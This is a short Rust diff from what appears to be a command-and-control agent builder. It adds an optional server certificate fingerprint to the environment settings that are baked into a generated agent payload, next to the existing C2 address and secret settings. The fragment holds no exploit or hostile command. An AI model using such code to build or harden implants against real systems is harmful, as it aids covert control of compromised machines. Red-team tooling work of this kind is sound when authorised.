@@ -26,6 +26,9 @@ pub fn build_agent_for_profile(cfg: &PayloadConfig) -> Result<Vec<u8>> {
     let mut extra_env: Vec<(String, String)> = Vec::new();
     if effective_features.iter().any(|f| f == "outbound-c") {
         extra_env.push(("ORCHESTRA_C_ADDR".into(), cfg.c2_address.clone()));
+        if let Some(ref fp) = cfg.server_cert_fingerprint {
+            extra_env.push(("ORCHESTRA_C_CERT_FP".into(), fp.clone()));
+        }
         if let Some(ref secret) = cfg.c_server_secret {
             extra_env.push(("ORCHESTRA_C_SECRET".into(), secret.clone()));
         } else {
